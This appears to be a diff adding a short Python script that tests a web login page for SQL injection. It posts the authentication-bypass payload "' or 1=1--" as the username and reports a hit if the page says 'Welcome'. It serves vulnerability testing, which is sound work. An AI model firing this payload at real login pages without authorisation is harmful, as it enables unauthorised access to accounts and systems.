@@ -1,0 +1,17 @@
+print('CREATED BY ANESTUS UDUME FROM BENTECH SECURITY')
+import requests
+
+# URL to the login page of the web application
+url = "http://example.com/login"
+
+# Payload to test for SQL injection vulnerability
+payload = "' or 1=1--"
+
+# Make a POST request with the payload to the login page
+response = requests.post(url, data={"username": payload, "password": ""})
+
+# Check the response for indications of successful login
+if "Welcome" in response.text:
+    print("SQL injection vulnerability found!")
+else:
+    print("No SQL injection vulnerability detected.")
